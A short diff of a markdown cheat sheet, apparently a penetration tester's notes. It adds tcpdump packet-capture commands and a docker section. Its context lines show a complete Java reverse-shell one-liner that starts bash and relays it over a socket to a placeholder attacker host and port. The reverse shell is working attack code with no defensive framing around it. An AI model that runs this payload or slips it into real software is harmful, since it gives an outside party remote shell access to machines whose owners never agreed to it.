@@ -331,6 +331,9 @@ int port=<port>;
 String cmd="bash";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
+### TCPDUMP
+> 1. tcpdump -i enp3s0 -s 65535 port not 22 and port not 53 and port not 22022 and not icmp and not arp and not icmp6 -w /dev/shm/001.pcap
+> 1. tcpdump -i eth0 -s 65535 port not 22
 
 #### Go inside a docker
 > 1. ```docker container ls```
